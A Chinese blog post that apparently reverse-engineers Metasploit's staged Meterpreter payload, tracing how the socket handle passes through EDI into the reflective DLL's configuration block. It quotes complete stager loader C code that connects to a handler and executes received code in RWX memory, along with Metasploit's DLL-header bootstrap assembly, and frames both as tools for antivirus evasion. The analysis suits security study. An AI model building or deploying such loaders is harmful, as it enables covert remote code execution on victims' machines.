---
title: "metasploit payload运行原理浅析(sockedi调用约定是什么)"
date: 2020-05-09 17:39:00
tags:
- msf
- 红队
- 工具
- 逆向
categories:
- 开发
---

本篇文章主要讨论一下msf官方文档中提到的sockedi调用约定到底是指什么?

<!--more-->

## 背景

最近在做一些msf相关的事情，今天听到免杀相关的，去查询了下相关资料。

第一个不能错过的就是cobalt strike作者早年写的metasploit-loader项目了，我看了项目源码，找了一些相关资料

在 [Meterpreter载荷执行原理分析](https://xz.aliyun.com/t/1709) 文章发现了一些细节性的东西，也感谢该文作者的抛砖引玉，不过文中有一些错误以及未说明白的地方，我会一一道来。

注意：本文只是对我自己的分析结果进行一次复盘，如果有什么错误之处欢迎大家斧正

## metasploit loader

### metasploit的shellcode到底做了什么

首先我们需要探讨的第一个问题是metasploit的shellcode到底做了什么？

在msf的官方wiki中，官方有对这个问题做一些简单的解释

- [How payloads work](https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work)
- [中文翻译版在这](https://zhuanlan.zhihu.com/p/61412226)

从上面的文章我们大致能知道其实我们使用msf生成的shellcode只是一个加载器(Stagers)，然后加载器通过我们生成shellcode时指定的ip和端口回连过来取到真正执行的恶意载荷(Stages)

### 加载器(Stagers)回连的具体流程

那么提出第二个问题，这个加载器(Stagers)回连的具体代码流程是怎样的？

我们通过文档只能知道Stagers通过网络加载Stages，那么Stages是什么？shellcode？可执行文件？反射dll？这些我们还都不清楚。

然后通过网上一些零星的资料，找到了msf邮件组曾经的两封邮件（源地址已无法访问，所幸WebArchive有留存）

- [\[framework\] inline meterpreter payload](https://web.archive.org/web/20160729173425/https://dev.metasploit.com/pipermail/framework/2012-September/008660.html)
- [\[framework\] inline meterpreter payload](https://web.archive.org/web/20160729173608/https://dev.metasploit.com/pipermail/framework/2012-September/008664.html)

里面提到流程以及关键点

**流程**

> No tutorials that I know of, but here are the basic steps:
> 
> * connect to the handler
> * read a 4-byte length
> * allocate a length-byte buffer
> * mark it as writable and executable (on Windows you'll need
> VirtualProtect for this)
> * read length bytes into that buffer
> * jump to the buffer. easiest way to do this in C is cast it to a
> function pointer and call it.

**关键点**

> Assuming this is for X86 arch, you have to make sure that the EDI
> register contains your socket descriptor (the value of the ConnectSocket
> variable). You can do this via inline asm, but it might be easier to
> just prepend the 5 bytes for setting it to your shellcode:
> 
> BF 78 56 34 12           mov edi, 0x12345678
> 
> For 64 bit, you have to use the RDI register (and need 10 bytes):
> 
> 48 BF 78 56 34 12 00 00 00 00     mov rdi, 0x12345678
> 
> 
> Hope this helps,
> 
> 
> Michael
> 
> PS: This is the reason why the calling convention within Metasploit is
> called "sockedi" :-)
> 

也就是说主要的流程大致上就是

1. tcp连接
2. 读取socket前四个byte，这个为后面的载荷的长度
3. 分配可读可写可执行的内存，把载荷塞进去
4. 注意这段载荷的前面需要手动加 `mov edi, &socket`
5. 然后跳转到这块内存进行执行

实现起来并不困难，但是有些奇怪的点，比如为什么需要手动把edi的值设置为socket的地址？这个我们先放一放，看看一些loader的源码

**首先是[cobalt strike作者的](https://github.com/rsmudge/metasploit-loader)**

```c
int main(int argc, char * argv[]) {
	ULONG32 size;
	char * buffer;
	void (*function)();

	winsock_init();

	if (argc != 3) {
		printf("%s [host] [port]\n", argv[0]);
		exit(1);
	}

	/* connect to the handler */
	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));

	/* read the 4-byte length */
	int count = recv(my_socket, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		punt(my_socket, "read a strange or incomplete length value\n");

	/* allocate a RWX buffer */
	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL)
		punt(my_socket, "could not allocate buffer\n");

	/* prepend a little assembly to move our SOCKET value to the EDI register
	   thanks mihi for pointing this out
	   BF 78 56 34 12     =>      mov edi, 0x12345678 */
	buffer[0] = 0xBF;

	/* copy the value of our socket to the buffer */
	memcpy(buffer + 1, &my_socket, 4);

	/* read bytes into the buffer */
	count = recv_all(my_socket, buffer + 5, size);

	/* cast our buffer as a function and call it */
	function = (void (*)())buffer;
	function();

	return 0;
}
```

其他的函数我并没有列出来，里面的实现应该也很明白，就是我之前说的流程

**然后是先知社区的，其实也就是把上一份代码注释翻译了一下**

```c
//主函数
int main(int argc, char * argv[]) {
    ULONG32 size;
    char * buffer;
    //创建函数指针，方便XXOO
    void (*function)();
    winsock_init(); //套接字初始化
    //获取参数，这里随便写，接不接收无所谓，主要是传递远程主机IP和端口
    //这个可以事先定义好
    if (argc != 3) {
        printf("%s [host] [port] ^__^ \n", argv[0]);
        exit(1);
    }

    /*连接到处理程序，也就是远程主机 */
    SOCKET my_socket = my_connect(argv[1], atoi(argv[2]));

    /* 读取4字节长度
    *这里是meterpreter第一次发送过来的
    *4字节缓冲区大小2E840D00，大小可能会有所不同,当然也可以自己丢弃，自己定义一个大小
    */
    //是否报错
    //如果第一次不是接收的4字节那么就退出程序
    int count = recv(my_socket, (char *)&size, 4, 0);
    if (count != 4 || size <= 0)
        punt(my_socket, "read length value Error\n");

    /* 分配一个缓冲区 RWX buffer */
    buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (buffer == NULL)
        punt(my_socket, "could not alloc buffer\n");

    /* 
    *SOCKET赋值到EDI寄存器，装载到buffer[]中
    */
    //mov edi
    buffer[0] = 0xBF;

    /* 把我们的socket里的值复制到缓冲区中去*/
    memcpy(buffer + 1, &my_socket, 4);

    /* 读取字节到缓冲区
    *这里就循环接收DLL数据，直到接收完毕
    */
    count = recv_all(my_socket, buffer + 5, size);

    /* 将缓冲区作为函数并调用它。
    * 这里可以看作是shellcode的装载，
    * 因为这本身是一个DLL装载器，完成使命，控制权交给DLL，
    * 但本身不退出，除非迁移进程，靠DLL里函数，DLL在DLLMain里是循环接收指令的，直到遇到退出指令，
    * (void (*)())buffer的这种用法经常出现在shellcode中
    */
    function = (void (*)())buffer;
    function();
    return 0;
}
```

两份代码都没解决我们的疑问

我们直接翻翻msf源码

[lib/msf/core/payload/windows/reverse_tcp.rb](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb)

代码比较长我就不贴了，简要说一下， `asm_block_recv` 函数是接收载荷的函数，然后我们看看 `asm_reverse_tcp` 

```asm
      create_socket:
        push #{encoded_host}    ; host in little-endian format
        push #{encoded_port}    ; family AF_INET and port number
        mov esi, esp            ; save pointer to sockaddr struct
        push eax                ; if we succeed, eax will be zero, push zero for the flags param.
        push eax                ; push null for reserved parameter
        push eax                ; we do not specify a WSAPROTOCOL_INFO structure
        push eax                ; we do not specify a protocol
        inc eax                 ;
        push eax                ; push SOCK_STREAM
        inc eax                 ;
        push eax                ; push AF_INET
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
        call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
        xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
```

call WSASocketA 之后返回的是socket句柄，返回值一般是在eax里面，然后把eax赋值到了edi

继续找找edi，但是发现剩下的edi都是用作调用，好像没有什么明显的作用，那为什么有这个？


## 这个载荷Stages具体是怎么生成的？

这里就要引入我刚才说的先知上的那篇文章的问题了，在 [Meterpreter载荷执行原理分析](https://xz.aliyun.com/t/1709) 文章中，作者提到

> metasploit的meterpreter的payload调用了meterpreter_loader.rb文件，在meterpreter_loader.rb文件中又引入了reflective_dll_loader.rb文件，reflective_dll_loader.rb主要是获取ReflectiveLoader()的偏移地址，用于重定位使用，没有什么可分析的。我们来到这个文件里reflectivedllinject.rb，这个文件主要是修复反射dll的，meterpreter_loader.rb文件主要是用于自身模块使用，修复dll和读取payload的长度的。
> 

其实 `windows/meterpreter/reverse_tcp` 是走的 `meterpreter_loader`，而不是文中的 `reflectivedllinject`，我通过调试发现这个请求载荷的过程是流经 `meterpreter_loader` 文件的

不过这两个文件的功效都是差不多的，我们打开分析一下

映入眼帘的应该是这段

```ruby
  def stage_meterpreter(opts={})
    # Exceptions will be thrown by the mixin if there are issues.
    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll'))

    asm_opts = {
      rdi_offset: offset,
      length:     dll.length,
      stageless:  opts[:stageless] == true
    }

    asm = asm_invoke_metsrv(asm_opts)

    # generate the bootstrap asm
    bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string

    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
    if bootstrap.length > 62
      raise RuntimeError, "Meterpreter loader (x86) generated an oversized bootstrap!"
    end

    # patch the bootstrap code into the dll's DOS header...
    dll[ 0, bootstrap.length ] = bootstrap

    dll
  end
```

这段代码里面首先取到了metsrv的dll的文件，然后传入 `asm_invoke_metsrv` 函数做处理，生成汇编字节码，然后替换这个dll的头部

我们看看 `load_rdi_dll` 函数，这个函数取到了一个偏移量然后传入 `asm_invoke_metsrv` 函数做处理了

```ruby
  def load_rdi_dll(dll_path)
    dll = ''
    ::File.open(dll_path, 'rb') { |f| dll = f.read }

    offset = parse_pe(dll)

    unless offset
      raise "Cannot find the ReflectiveLoader entry point in #{dll_path}"
    end

    return dll, offset
  end

  def parse_pe(dll)
    pe = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(dll))
    offset = nil

    pe.exports.entries.each do |e|
      if e.name =~ /^\S*ReflectiveLoader\S*/
        offset = pe.rva_to_file_offset(e.rva)
        break
      end
    end

    offset
  end
```

甚至我们不用深究这些函数的具体流程，看名称就知道，这个是从dll导出表找到了ReflectiveLoader导出函数的地址

然后进入 `asm_invoke_metsrv` 看看

```ruby
  def asm_invoke_metsrv(opts={})
    asm = %Q^
        ; prologue
          dec ebp               ; 'M'
          pop edx               ; 'Z'
          call $+5              ; call next instruction
          pop ebx               ; get the current location (+7 bytes)
          push edx              ; restore edx
          inc ebp               ; restore ebp
          push ebp              ; save ebp for later
          mov ebp, esp          ; set up a new stack frame
        ; Invoke ReflectiveLoader()
          ; add the offset to ReflectiveLoader() (0x????????)
          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
          call ebx              ; invoke ReflectiveLoader()
        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
          ; offset from ReflectiveLoader() to the end of the DLL
          add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
    ^

    unless opts[:stageless] || opts[:force_write_handle] == true
      asm << %Q^
          mov [ebx], edi        ; write the current socket/handle to the config
      ^
    end

    asm << %Q^
          push ebx              ; push the pointer to the configuration start
          push 4                ; indicate that we have attached
          push eax              ; push some arbitrary value for hInstance
          call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
    ^
  end
```

不得不说这段十分巧妙，我们想想刚才的流程是什么，排开那个 `mov edi, &socket` 不论，剩下的就是从传回来的载荷的首地址开始跑了，那假如是一个dll文件，你把一个平常的dll文件，VirtualAlloc后直接跳到地址跑，能跑起来吗？显然是不能的，我们看看msf中的处理

我们上面的代码分析过，这个汇编最后是替换了dll的头部，pe文件的头部就是dos头，dos头必须是MZ开头，不然这个根本算不上一个pe文件

那 `dec ebp` 和 `pop edx` 算怎么回事？

其实这两条汇编的机器码就是

```
\x4D # dec ebp
\x5A # pop edx
```

恰好构成了MZ头，然后继续往下跑，调用了ReflectiveLoader()，这个是反射dll技术，具体代码技术细节可以见 [https://github.com/stephenfewer/ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)

调用该dll导出函数 `ReflectiveLoader` 的主要功能就是加载dll自身到内存中，然后返回dllmain的函数地址，返回值是在eax里面

然后调用 `mov [ebx], edi        ; write the current socket/handle to the config` 把edi也就是上文提到的socket句柄地址存入ebx执行的内存，上面可以看到

```asm
 ; offset from ReflectiveLoader() to the end of the DLL
add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
```

这段汇编把ebx指向到了该dll加载空间的末尾

紧接着执行

```asm
push ebx              ; push the pointer to the configuration start
push 4                ; indicate that we have attached
push eax              ; push some arbitrary value for hInstance
call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
```

调用储存在eax中的dllmain的函数

其中的ebx到底是什么？

我们把目光再往外层拉

```
  def stage_payload(opts={})
    stage_meterpreter(opts) + generate_config(opts)
  end

  def generate_config(opts={})
    ds = opts[:datastore] || datastore
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      arch:              opts[:uuid].arch,
      null_session_guid: opts[:null_session_guid] == true,
      exitfunk:          ds[:exit_func] || ds['EXITFUNC'],
      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
      uuid:              opts[:uuid],
      transports:        opts[:transport_config] || [transport_config(opts)],
      extensions:        [],
      stageless:         opts[:stageless] == true
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end
```

可以看到 `stage_payload` 中把生成好的dll字节码和一串config拼接了起来，config里面的参数要分析的话又是一大块了，本文不着眼于此

跟进 `config.to_b` 看看

```ruby
  def to_b
    config_block
  end
  
  def config_block
    # start with the session information
    config = session_block(@opts)

    # then load up the transport configurations
    (@opts[:transports] || []).each do |t|
      config << transport_block(t)
    end

    # terminate the transports with NULL (wchar)
    config << "\x00\x00"

    # configure the extensions - this will have to change when posix comes
    # into play.
    file_extension = 'x86.dll'
    file_extension = 'x64.dll' unless is_x86?

    (@opts[:extensions] || []).each do |e|
      config << extension_block(e, file_extension)
    end

    # terminate the extensions with a 0 size
    config << [0].pack('V')

    # wire in the extension init data
    (@opts[:ext_init] || '').split(':').each do |cfg|
      name, value = cfg.split(',')
      config << extension_init_block(name, value)
    end

    # terminate the ext init config with a final null byte
    config << "\x00"

    # and we're done
    config
  end
```

然后我们跟进 `session_block` 和 `transport_block` 看看就能明白这就是一串配置转化为字节码，具体的转化规则我们不论

可以看到 函数里面有

```ruby
    session_data = [
      0,                  # comms socket, patched in by the stager
      exit_func,          # exit function identifer
      opts[:expiration],  # Session expiry
      uuid,               # the UUID
      session_guid        # the Session GUID
    ]

    session_data.pack('QVVA*A*')
```

最开始的是0，pack的格式是Q，8位，这8位是干嘛的？

现在回过头想想，当之前生成好的dll载荷，我们从首地址开始跑，我们刚才那个edi(socket地址)填充到哪了，是不是那个dll空间的末尾再往后填，这个空间不恰好就是这8位0吗？

## 所谓的sockedi到底是啥？

### 跟踪edi

根据我们前面的分析，我们把[加载器](https://github.com/rsmudge/metasploit-loader/blob/master/loader.exe)挂调试器跑起来看看

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/0ac8c276ed1f1946c31c5b4261bb368e..png)

首先分配完RWX内存空间后，我们看到了首地址 `0x6A0000`，然后我们在内存窗口中转到该地址，那我们重点关注的是dll所在区域的末尾，我们直接把内存地址转到 `0x6CAC06`（别问我怎么知道的，方法很多，比如多次调试）

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/b3cf2f3287ec9d02a562d7f83f619156..png)

我们首先把内存地址转到这个地方然后往下跑把数据接过来看看

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/d53b9248e68a4f95d8bdc663b7067b46..png)

现在前八位还是空的，但是后面已经有一些数据了，包括一些能看到文字的配置（比如tcp://0.0.0.0:4444）然后继续下跑，进到我们分配出来的函数去看看

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/e89a358c69064d2bdf833f56226f7c43..png)


首当其冲的就是我们的 `mov edi, &socket`，继续往下

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/9a740790478d8c81e6c9298cc0132643..png)


可以看到，和我们预期的一样，复制到了这八位的空间里面，这里可以配合msf源码以及我的注释查看

### 分析用作载荷的反射dll

还记得我们前面分析的源码中的metsrv dll文件吗？

我们可以在 [metasploit-payloads](https://github.com/rapid7/metasploit-payloads) 中找到这个项目的源码

我们直接看看[metsrc dllmain函数](https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/metsrv/metsrv.c#L47)

```c
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;

	switch (dwReason)
	{
	case DLL_METASPLOIT_ATTACH:
		bReturnValue = Init((MetsrvConfig*)lpReserved);
		break;
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
```

刚才调用dllmain我们是使用了 `calleax ;call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)`

我们这个 `config_ptr` 传递的是什么？是 `push ebx              ; push the pointer to the configuration start`，也就是那个首8位塞了我们socket句柄地址的数据的起始地址，然后走 `DLL_METASPLOIT_ATTACH` 分支，把这个地址中的数据强转为了 `MetsrvConfig` 结构体

我们看看 `MetsrvConfig` 结构体

```c
typedef struct _MetsrvConfig
{
	MetsrvSession session;
	MetsrvTransportCommon transports[1];  ///! Placeholder for 0 or more transports
	// Extensions will appear after this
	// After extensions, we get a list of extension initialisers
	// <name of extension>\x00<datasize><data>
	// <name of extension>\x00<datasize><data>
	// \x00
} MetsrvConfig;

typedef struct _MetsrvSession
{
	union
	{
		UINT_PTR handle;
		BYTE padding[8];
	} comms_handle;                       ///! Socket/handle for communications (if there is one).
	DWORD exit_func;                      ///! Exit func identifier for when the session ends.
	int expiry;                           ///! The total number of seconds to wait before killing off the session.
	BYTE uuid[UUID_SIZE];                 ///! UUID
	BYTE session_guid[sizeof(GUID)];      ///! Current session GUID
} MetsrvSession;

typedef struct _MetsrvTransportCommon
{
	CHARTYPE url[URL_SIZE];               ///! Transport url:  scheme://host:port/URI
	int comms_timeout;                    ///! Number of sessions to wait for a new packet.
	int retry_total;                      ///! Total seconds to retry comms for.
	int retry_wait;                       ///! Seconds to wait between reconnects.
} MetsrvTransportCommon;
```

这些信息很明显能看到是一些信息，比如uuid，重试次数之类的，这些在payload的生成选项里面都能找到

那么我们现在差不多明白了，这一块的东西是强转成了这个结构体，包括edi中所存放的socket句柄地址

好吧，别忘了我们的**使命，搞清楚这个edi的作用**

划入这个结构体也就是

```
	union
	{
		UINT_PTR handle;
		BYTE padding[8];
	} comms_handle;                       ///! Socket/handle for communications (if there is one).
```

也就是我们找找 `comms_handle` 用在了哪

所以进到 `Init((MetsrvConfig*)lpReserved)` 里面看看

```c
DWORD Init(MetsrvConfig* metConfig)
{
	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	InitAppInstance();

	// In the case of metsrv payloads, the parameter passed to init is NOT a socket, it's actually
	// a pointer to the metserv configuration, so do a nasty cast and move on.
	dprintf("[METSRV] Getting ready to init with config %p", metConfig);
	DWORD result = server_setup(metConfig);

	dprintf("[METSRV] Exiting with %08x", metConfig->session.exit_func);

	// We also handle exit func directly in metsrv now because the value is added to the
	// configuration block and we manage to save bytes in the stager/header as well.
	switch (metConfig->session.exit_func)
	{
	case EXITFUNC_SEH:
		SetUnhandledExceptionFilter(NULL);
		break;
	case EXITFUNC_THREAD:
		ExitThread(0);
		break;
	case EXITFUNC_PROCESS:
		ExitProcess(0);
		break;
	default:
		break;
	}
	return result;
}
```

里面调用了 `server_setup` 然后吐出了结果，最后返回，跟到外层也就是dllmain的返回值，dllmain返回值作用我不赘述了，然后根据你的生成选项中的 `EXITFUNC` 来进行退出，退出进程、线程或者SEH异常，这里我们不管，我们看看 `server_setup` 函数

[server_setup函数](https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/metsrv/server_setup.c#L317)很长，我就不贴整个函数了

使用了 `comms_handle` 的我贴一下

```c
...
dprintf("[SESSION] Comms handle: %u", config->session.comms_handle);
...

dprintf("[DISPATCH] Transport handle is %p", (LPVOID)config->session.comms_handle.handle);
if (remote->transport->set_handle)
{
    remote->transport->set_handle(remote->transport, config->session.comms_handle.handle);
}
```

根据这些代码我们能够知道是把 Transport handle 设置为了我们之前创建的socket

继续往后找我们能找到

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/2c9398d368f42a09d7d0f0877b461c79..png)


然后跟进 `transport_set_handle_tcp` 可以看到

```
/*!
 * @brief Get the socket from the transport (if it's TCP).
 * @param transport Pointer to the TCP transport containing the socket.
 * @return The current transport socket FD, if any, or zero.
 */
static UINT_PTR transport_get_handle_tcp(Transport* transport)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
	{
		return (UINT_PTR)((TcpTransportContext*)transport->ctx)->fd;
	}

	return 0;
}

/*!
 * @brief Set the socket from the transport (if it's TCP).
 * @param transport Pointer to the TCP transport containing the socket.
 * @param handle The current transport socket FD, if any.
 */
static void transport_set_handle_tcp(Transport* transport, UINT_PTR handle)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
	{
		((TcpTransportContext*)transport->ctx)->fd = (SOCKET)handle;
	}
}
```

也只是转为了socket句柄，然后给外部再继续通过这个socket去取一些服务器上的东西（后面的我没再跟下去了，我猜测也只有这种可能）

## 总结

这次的分析耗时一天，从上午看到讨论免杀，加载器，然后开始分析，说实话，还是收获了不少，比如那个反射dll的改dos头就让我不得不佩服，卧槽，这操作骚。本次只是拿 `windows/meterpreter/reverse_tcp` 开刀，我相信其他的也一样，不然何以被官方称 `sockedi` 调用约定，说明这已经是msf里面加载的约定成俗的东西了。

那么从这次的分析中我们能获得哪些启示？当然是免杀对抗的启示，antiAV方可以通过研究使用自己的payload格式，AV方可以通过这个流程来对msf的payload的查杀更上一步，或者根据里面的改DOS头技术打造自己的模块化RAT

### 下一步可以做的

1. 研究payload uuid的回传
2. 研究rc4，aes之类的所谓加密shellcode，加密是在哪里
3. ...
 
### 现在就可以得到的
 
1. 当然是一个香喷喷的shellcode加载器，具体实现就是八仙过海各显神通了。
2. 改DOS头直接执行的技术